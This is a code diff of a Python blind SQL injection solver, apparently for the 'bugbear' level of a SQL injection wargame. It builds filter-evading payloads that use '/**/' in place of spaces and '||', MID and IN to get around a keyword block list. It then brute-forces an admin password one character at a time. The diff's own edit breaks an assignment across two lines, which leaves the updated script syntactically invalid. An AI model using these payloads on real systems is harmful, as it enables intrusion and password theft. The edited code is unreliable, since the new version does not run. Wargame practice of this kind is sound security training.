@@ -3,13 +3,14 @@ filter = '(single quote), substr, ascii, =, or, and, whitespace, like, 0x
 '''
 
 import urllib.request
-from urllib.parse import quote # url encoding func
+from urllib.parse import quote  # url encoding func
 
 url = 'http://los.rubiya.kr/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?no='
 result = ""
 pwlen = 0
 
 __author__ = "goodasd123@naver.com - h4lo"
+
 
 def req(query):
     re = urllib.request.Request(query)
@@ -30,8 +31,9 @@ for i in range(0, 10):
         print("Matching.. -> [{}]".format(i))
 
 for i in range(1, pwlen + 1):
-    for j in range(ord('0'), (ord('z') + 1)):   
-        add_url = '-1/**/||/**/MID(pw,1,{})/**/IN("{}")--'.format(i, result + chr(j))
+    for j in range(ord('0'), (ord('z') + 1)):
+        add_url =
+        '-1/**/||/**/MID(pw,1,{})/**/IN("{}")--'.format(i, result + chr(j))
         query = url + quote(add_url)
 
         if str(req(query).read()).find('Hello admin') != -1:
